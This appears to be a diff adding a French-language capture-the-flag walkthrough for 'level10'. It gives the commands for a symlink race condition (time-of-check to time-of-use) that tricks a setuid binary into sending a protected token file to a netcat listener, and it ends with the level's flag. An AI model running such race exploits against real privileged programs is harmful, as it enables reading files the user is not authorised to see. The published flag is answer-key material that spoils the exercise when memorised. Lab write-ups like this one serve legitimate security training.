@@ -1,0 +1,26 @@
+Dans ce lvl, nous avons un executable et un fichier token en appliquant strings dessus, nous pouvons voir que nous devons envoyer un fichier sur le port 6969
+Pour cela nous ouvrons un autre terminal nous nous redirigeons vers le level10 et nous executons la commande suivante :
+	-> nc -l 6969
+	Cela permet de creer une connexion entre le client et le serveur sur le port 6969
+
+	Nous allons une fois creer la connexion et nous executons la commande suivant :
+	-> ./level10 /tmp/lvl10/token IP
+
+	Le fichier token dans le repertoire tmp sera un fichier token fake que nous allons envoyer au serveur
+	Une fois le fichier envoyer nous creons un liens symbolique entre le fichier fake que nous avons envoye et le fichier token de notre racine sur un fichier que l'on va appeler token10 dans une boucle while afin 
+	de forcer la creation du liens : 
+		on utilise la race condition.
+		CAD on va recuperer le fichier entre le temps ou le programme check les permissions et accedes au fichier.
+
+	-> while true; do ln -fs ~/token /tmp/lvl/token10; ln -fs /tmp/lvl/token /tmp/lvl/token10; done&
+
+	Une fois le liens creer on lance le serveur :
+	-> nc -kl 6969
+	Cela permet de forcer a garder le serveur en ligne apres qu'il a recu une connexion
+
+	Ensuite nous executons la commande suivante qui va nous permettre d'afficher le resultat du fichier sur notre serveur:
+	-> while true; do ~/level10 /tmp/lvl/token10 IP;done&
+
+	resultat flag:
+	-> woupa2yuojeeaaed06riuj63c
+	
